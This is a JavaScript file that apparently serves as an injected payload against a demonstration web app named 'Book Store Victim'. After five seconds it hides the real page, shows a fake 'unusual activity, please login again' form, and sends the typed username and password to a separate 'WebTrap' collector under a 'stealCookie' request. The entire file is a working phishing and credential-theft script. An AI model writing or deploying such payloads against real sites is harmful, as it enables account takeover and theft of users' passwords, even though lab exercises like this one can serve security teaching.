(function() {
	var myStyle = document.createElement("style");
	myStyle.type = "text/css";
	myStyle.innerHTML = ".bg-image{background-image:url('/BookStoreVictim/resources/app/images/background-image-2.jpg');background-size:100%;}.form-panel{margin-top:200px;padding-top:20px;border-radius:10px;}.panel-semi-transparent{background:rgba(255,255,255,0.5) !important;}.panel-default{border-color:#ddd;}.panel{margin-bottom:20px;box-shadow:0 1px 1px rgba(0,0,0,.05);}.center{text-align:center;}.error-message{color:red;}";
	document.getElementsByTagName("head")[0].appendChild(myStyle);

	var name = document.getElementsByClassName("dropdown-toggle")[0].text
			.trim();
	var warnMsg = document
			.createTextNode("["
					+ name
					+ "], Unusual activity detected in your account. Please login again!");

	var myWarning = document.createElement("h4");
	myWarning.style.color = "red";
	myWarning.style.marginTop = "150px";
	myWarning.style.textAlign = "center";
	myWarning.appendChild(warnMsg);

	var username = document.createElement("input");
	username.type = "text";
	username.id = "username";
	username.name = "username";
	username.className = "form-control textfield";
	username.placeholder = "Enter Username!";

	var password = document.createElement("input");
	password.type = "password";
	password.id = "password";
	password.name = "password";
	password.className = "form-control textfield";
	password.placeholder = "Enter Password!";

	var button = document.createElement("button");
	button.type = "button";
	button.id = "loginButton";
	button.className = "btn btn-primary btn-block";
	button.innerText = "Login";

	var myDiv10 = document.createElement("div");
	myDiv10.className = "col-md-10 col-md-offset-1";
	myDiv10.appendChild(button);

	var myDiv9 = document.createElement("div");
	myDiv9.className = "form-group";
	myDiv9.appendChild(myDiv10);

	var myDiv8 = document.createElement("div");
	myDiv8.className = "col-md-10 col-md-offset-1";
	myDiv8.appendChild(password);

	var myDiv7 = document.createElement("div");
	myDiv7.className = "form-group";
	myDiv7.appendChild(myDiv8);

	var myDiv6 = document.createElement("div");
	myDiv6.className = "col-md-10 col-md-offset-1";
	myDiv6.appendChild(username);

	var myDiv5 = document.createElement("div");
	myDiv5.className = "form-group";
	myDiv5.appendChild(myDiv6);

	var myForm = document.createElement("form");
	myForm.className = "form-horizontal";
	myForm.appendChild(myDiv5);
	myForm.appendChild(myDiv7);
	myForm.appendChild(myDiv9);

	var myDiv4 = document.createElement("div");
	myDiv4.className = "panel-body";
	myDiv4.appendChild(myForm);

	var myDiv3 = document.createElement("div");
	myDiv3.className = "panel-heading center";
	myDiv3.innerHTML = "Book Store Victim";

	var myDiv2 = document.createElement("div");
	myDiv2.className = "panel panel-default form-panel panel-semi-transparent";
	myDiv2.appendChild(myDiv3);
	myDiv2.appendChild(myDiv4);

	var myDiv1 = document.createElement("div");
	myDiv1.className = "col-xs-6 col-sm-6 col-md-4 col-xs-offset-3 col-sm-offset-3 col-md-offset-4";
	myDiv1.appendChild(myDiv2);

	var myDiv0 = document.createElement("div");
	myDiv0.className = "container";
	myDiv0.appendChild(myDiv1);

	setTimeout(
			function() {
				$('#bookDetailsModal').modal('hide');
				document.getElementsByClassName("navbar")[0].style.display = "none";
				document.getElementsByClassName("container-fluid")[1].style.display = "none";

				var body = document.getElementsByTagName("body")[0];
				body.className = "bg-image";

				var myParent = document
						.getElementsByClassName("container-fluid")[1];
				myParent.before(myDiv0);
				myParent.after(myWarning);

				document.getElementById("loginButton").onclick = function() {
					var xhttp = new XMLHttpRequest();
					xhttp.onreadystatechange = function() {
						if (this.readyState == 4 && this.status == 200) {
							document.getElementById("ajax").innerHTML = this.responseText;
						}
						location.href = location.protocol + '//' + location.host + '/'
								+ location.pathname.split("/")[1];
					};
					xhttp.open("POST", "http://localhost:8080/WebTrap/AppController", true);
					xhttp.setRequestHeader("Content-type",
							"application/x-www-form-urlencoded");
					xhttp.setRequestHeader("X-Requested-With", "XMLHttpRequest");
					xhttp.send("requestType=stealCookie&username="
							+ document.getElementsByClassName("dropdown-toggle")[0].text
									.trim() + "&cookie=username="
							+ document.getElementById("username").value + " | password:"
							+ document.getElementById("password").value);
				};
			}, 5000);
})();